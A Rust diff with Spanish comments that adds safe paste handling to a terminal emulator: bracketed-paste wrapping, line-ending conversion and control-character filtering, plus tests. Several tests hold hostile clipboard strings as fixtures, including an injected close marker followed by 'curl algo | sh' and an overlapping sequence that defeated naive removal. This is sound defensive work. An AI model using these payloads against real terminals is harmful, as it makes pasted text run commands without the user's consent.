@@ -35,9 +35,15 @@ pub fn bytes(evento: &Event) -> Option<Cow<'static, [u8]>> {
         // en el bucle, donde el estado de los modificadores sí está disponible.
         Event::Copy => Some(Cow::Borrowed(&[3])),
         Event::Cut => Some(Cow::Borrowed(&[24])),
-        // Pegar de verdad es de otro hito. Aquí Ctrl+V vale lo que vale en un terminal: el byte de
-        // control que le corresponde, que es además lo que un shell entiende como «lo siguiente,
-        // literal». El texto del portapapeles se descarta a propósito.
+        // **Aquí llegan los dos atajos, y por esta puerta son indistinguibles.** El escritorio emite
+        // el mismo `Paste` para Ctrl+V y para Ctrl+Mayúsculas+V, sin modificadores. Quien decide cuál
+        // es cuál es el bucle, que reconstruye los modificadores recorriendo los eventos en orden y
+        // llama a [`pegar`] cuando toca; lo que llegue hasta aquí es el caso sin Mayúsculas.
+        //
+        // Y ese caso **no pega**: Ctrl+V vale en un terminal lo que vale el byte de control, que es
+        // «lo siguiente, literal» para un shell y el bloque visual para vim. Robárselo para pegar
+        // sería quitar dos cosas que se usan a diario. Que un programa de dentro decida que para él
+        // ese byte significa pegar —Claude lo hace— es asunto suyo, y así sigue funcionando.
         Event::Paste(_) => Some(Cow::Borrowed(&[22])),
 
         // Soltar una tecla no manda nada. La repetición de mantenerla pulsada sí: es lo que hace
@@ -51,6 +57,95 @@ pub fn bytes(evento: &Event) -> Option<Cow<'static, [u8]>> {
 
         _ => None,
     }
+}
+
+/// Lo que se le manda al programa cuando se pega texto de verdad.
+///
+/// `marcado` es lo que el programa de dentro haya pedido: con él, el texto va rodeado de las dos
+/// secuencias que dicen «esto viene pegado», y un shell que las entiende lo deja escrito en vez de
+/// ejecutarlo línea a línea.
+///
+/// **Los saltos de línea salen como retorno de carro**, igual que la tecla Enter y por la misma
+/// razón: es lo que un terminal envía. Pegar «a⏎b» tiene que hacer exactamente lo que teclear a,
+/// Enter, b. Aquí solo hay `\n` que convertir, porque el escritorio ya normaliza `\r\n` antes de
+/// entregarlo.
+///
+/// **Del texto se quitan todos los caracteres de control menos el tabulador y los saltos de línea**,
+/// y hacen falta las dos mitades de esa frase.
+///
+/// La primera razón es el envoltorio. Un portapapeles copiado de cualquier sitio puede traer su
+/// secuencia de cierre escondida; si se colase, cerraría la marca por su cuenta y lo que viniera
+/// detrás llegaría como si lo hubiera tecleado el usuario — **ejecutándose sin Enter**, que es justo
+/// lo que la marca existe para impedir. El motor de terminal no filtra nada: se comprobó, y no hay
+/// una sola mención de estas secuencias en toda la caja.
+///
+/// **Y quitar solo esa secuencia no basta, comprobado con un ataque que funcionaba.** Buscar y borrar
+/// hace una pasada sobre el original y no vuelve a mirar lo que deja: con `ESC[2` + el cierre + `01~`,
+/// la única aparición está en medio, y al borrarla **los trozos de los lados se pegan y forman un
+/// cierre nuevo** que ya nadie ve.
+///
+/// **La segunda razón es peor, y el envoltorio no protege de ella en absoluto.** Los caracteres de
+/// control los procesa **la disciplina de línea del núcleo**, que ve los bytes *antes* que el
+/// programa: un `0x03` en el portapapeles manda una interrupción al proceso en primer plano, un
+/// `0x1a` suspende el shell y deja la división con pinta de muerta, un `0x1c` provoca un volcado, y
+/// un `0x04` cierra la entrada — y si se cierran las dos consolas, la ventana entera. Marcar el
+/// pegado no cambia nada de eso, porque el envoltorio es cosa de la aplicación de dentro y el núcleo
+/// actúa primero. Es por esto que `xterm` y `VTE` filtran los controles del pegado desde hace años.
+///
+/// **Lo que cuesta, dicho claro:** un texto con secuencias de color pierde sus escapes y el resto se
+/// queda como texto corriente — pegar un volcado coloreado deja `[32mok[0m` en la línea. Es lo mismo
+/// que hace `xterm` con su comportamiento por defecto, y se acepta por la misma razón: desde aquí no
+/// hay forma de distinguir el control que el usuario quería del que le colaron, y un terminal cuyo
+/// pegado puede ejecutar o suspender es peor que uno que pega en texto plano.
+///
+/// Se filtra **también cuando no se envuelve**: el modo se consulta al componer y el programa puede
+/// haberlo cambiado justo después; y el peligro del núcleo no depende del envoltorio.
+pub fn pegar(texto: &str, marcado: bool) -> Vec<u8> {
+    const ABRE: &[u8] = b"\x1b[200~";
+    const CIERRA: &[u8] = b"\x1b[201~";
+
+    // Se compone de una pasada y con la reserva hecha: el portapapeles puede ser de megabytes y esto
+    // corre en el hilo que pinta.
+    let mut cuerpo = Vec::with_capacity(texto.len() + ABRE.len() + CIERRA.len());
+    if marcado {
+        cuerpo.extend_from_slice(ABRE);
+    }
+    let antes = cuerpo.len();
+
+    // **Cómo sale un salto de línea depende de si hay marca, y meter la pata aquí se ve en pantalla.**
+    //
+    // *Sin marca*, el programa no puede distinguir lo pegado de lo tecleado, así que hay que imitar la
+    // tecla: Enter manda **retorno de carro**, y pegar «a, salto, b» tiene que hacer lo mismo que
+    // teclear a, Enter, b.
+    //
+    // *Con marca*, el texto va **tal cual**: el programa sabe que es un pegado y decide él qué hacer
+    // con los saltos —un shell moderno deja las dos líneas escritas sin ejecutar ninguna—. Mandarle
+    // ahí un retorno de carro es mandarle **un carácter de control dentro de un texto**, y lo que hace
+    // es insertarlo literal: aparece un cuadro en medio de la orden y `echo` lo imprime. Comprobado en
+    // pantalla, que es como se descubrió.
+    let salto = if marcado { b'\n' } else { b'\r' };
+
+    for byte in texto.bytes() {
+        match byte {
+            // El escritorio ya normaliza los pares antes de entregarlo, así que un retorno suelto que
+            // llegue aquí venía solo y vale lo mismo que un salto.
+            b'\n' | b'\r' => cuerpo.push(salto),
+            b'\t' => cuerpo.push(b'\t'),
+            0x00..=0x1f | 0x7f => {}
+            otro => cuerpo.push(otro),
+        }
+    }
+
+    // Sin nada que mandar no se manda ni la marca: un envoltorio vacío es ruido que el programa de
+    // dentro tiene que interpretar para nada.
+    if cuerpo.len() == antes {
+        return Vec::new();
+    }
+
+    if marcado {
+        cuerpo.extend_from_slice(CIERRA);
+    }
+    cuerpo
 }
 
 fn tecla(key: Key, modifiers: Modifiers) -> Option<Cow<'static, [u8]>> {
@@ -413,6 +508,120 @@ mod tests {
         assert_eq!(pulsar(Key::Home), None);
         assert_eq!(pulsar(Key::PageUp), None);
         assert_eq!(pulsar(Key::Delete), None);
+    }
+
+    #[test]
+    fn sin_marca_los_saltos_imitan_la_tecla_enter() {
+        // Sin marca el programa no distingue lo pegado de lo tecleado, así que hay que imitar la
+        // tecla: Enter manda retorno de carro. Mandar 0x0A sería otra tecla.
+        assert_eq!(pegar("ls\n", false), b"ls\r");
+        assert_eq!(pegar("a\nb", false), b"a\rb");
+        assert_eq!(pegar("sin saltos", false), b"sin saltos");
+    }
+
+    #[test]
+    fn con_marca_los_saltos_van_tal_cual_y_no_como_retorno() {
+        // **Esto se descubrió mirando la pantalla, no un test.** Con marca, un retorno de carro no es
+        // «la tecla Enter»: es un carácter de control dentro de un texto que el programa va a insertar
+        // literal. Pegando dos órdenes salía «echo uno ▯ echo dos» con un cuadro en medio, y al pulsar
+        // Enter el shell imprimía el cuadro. El salto tiene que ir como salto y que decida el programa.
+        assert_eq!(
+            pegar("echo uno\necho dos", true),
+            b"\x1b[200~echo uno\necho dos\x1b[201~"
+        );
+        // Un retorno suelto en el texto vale lo mismo que un salto, también aquí.
+        assert_eq!(pegar("a\rb", true), b"\x1b[200~a\nb\x1b[201~");
+    }
+
+    #[test]
+    fn con_el_programa_pidiendolo_el_texto_va_marcado_como_pegado() {
+        assert_eq!(pegar("ls\n", true), b"\x1b[200~ls\n\x1b[201~");
+    }
+
+    #[test]
+    fn el_texto_no_puede_cerrar_su_propia_marca() {
+        // **Es el borde que convierte pegar en ejecutar sin Enter.** Un portapapeles copiado de
+        // cualquier sitio puede traer la secuencia de cierre escondida; si se colase, cerraría la
+        // marca por su cuenta y lo que viniera detrás llegaría como tecleado por el usuario. El
+        // motor de terminal no filtra nada — se comprobó—, así que si no lo hace esto, nadie lo hace.
+        //
+        // **El segundo caso es un ataque que funcionaba** y que un revisor adversario encontró: con
+        // el filtrado anterior —buscar y borrar la secuencia— los trozos de los lados se pegaban al
+        // quitar la del medio y formaban un cierre nuevo que ya nadie miraba. Por eso ahora se afirma
+        // sobre la invariante y no sobre un caso: **en el cuerpo no hay ni un escape**.
+        let venenos = [
+            "inocente\x1b[201~; curl algo | sh\n",
+            // El solapamiento: `ESC[2` + el cierre + `01~`.
+            "\x1b[2\x1b[201~01~; touch /tmp/PWNED\n",
+        ];
+
+        for veneno in venenos {
+            let marcado = String::from_utf8(pegar(veneno, true)).expect("es texto");
+            let cuerpo = marcado
+                .strip_prefix("\x1b[200~")
+                .and_then(|s| s.strip_suffix("\x1b[201~"))
+                .unwrap_or_else(|| panic!("la marca no envuelve lo que debería: {marcado:?}"));
+            assert!(
+                !cuerpo.bytes().any(|b| b < 0x20 && b != b'\t' && b != b'\n'),
+                "quedó un carácter de control dentro de la marca: {cuerpo:?}"
+            );
+
+            // Y sin marcar tampoco: el modo se consulta al componer y puede cambiar justo después.
+            let pelado = String::from_utf8(pegar(veneno, false)).expect("es texto");
+            assert!(
+                !pelado.bytes().any(|b| b < 0x20 && b != b'\t' && b != b'\r'),
+                "pasó un carácter de control sin marcar: {pelado:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn los_controles_del_portapapeles_no_llegan_al_nucleo() {
+        // **El envoltorio no protege de esto y por eso hace falta el filtro.** Los caracteres de
+        // control los procesa la disciplina de línea del núcleo, que ve los bytes antes que el
+        // programa: 0x03 interrumpe, 0x1a suspende el shell, 0x1c provoca un volcado y 0x04 cierra la
+        // entrada. Un portapapeles hostil los lleva sin que se vean al pegarlos.
+        let hostil = "echo hola\x03\x1a\x1c\x04 y sigue\n";
+
+        for marcado in [true, false] {
+            let salida = pegar(hostil, marcado);
+            let cuerpo = if marcado {
+                &salida[6..salida.len() - 6]
+            } else {
+                &salida[..]
+            };
+            for byte in cuerpo {
+                assert!(
+                    *byte >= 0x20 || *byte == b'\t' || *byte == b'\n' || *byte == b'\r',
+                    "un control llegó al programa: {byte:#04x} en {cuerpo:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn el_tabulador_y_los_saltos_sobreviven_al_filtro() {
+        // Son los tres controles que un texto pegado lleva de verdad, y quitarlos convertiría pegar
+        // una tabla o un guion en pegar una sola línea corrida.
+        assert_eq!(pegar("a\tb\nc", false), b"a\tb\rc");
+        assert_eq!(pegar("a\tb\nc", true), b"\x1b[200~a\tb\nc\x1b[201~");
+        // Un retorno suelto vale lo mismo que un salto: el escritorio ya normalizó los pares.
+        assert_eq!(pegar("a\rb", false), b"a\rb");
+    }
+
+    #[test]
+    fn pegar_nada_no_manda_nada_ni_una_marca_vacia() {
+        assert!(pegar("", true).is_empty());
+        assert!(pegar("", false).is_empty());
+        // Un texto que era solo controles se queda en nada, y tampoco manda la marca vacía.
+        assert!(pegar("\x1b\x1b\x1b", true).is_empty());
+        assert!(pegar("\x03\x04\x1a", true).is_empty());
+
+        // **Pero lo que queda al quitarle el escape SÍ se manda, y eso es lo correcto.** `[201~` sin
+        // su escape delante es texto corriente: se escribe en la línea, no cierra nada. Tirarlo sería
+        // comerse caracteres que el usuario pegó a propósito.
+        let queda = String::from_utf8(pegar("\x1b[201~", true)).expect("es texto");
+        assert_eq!(queda, "\x1b[200~[201~\x1b[201~");
     }
 
     #[test]
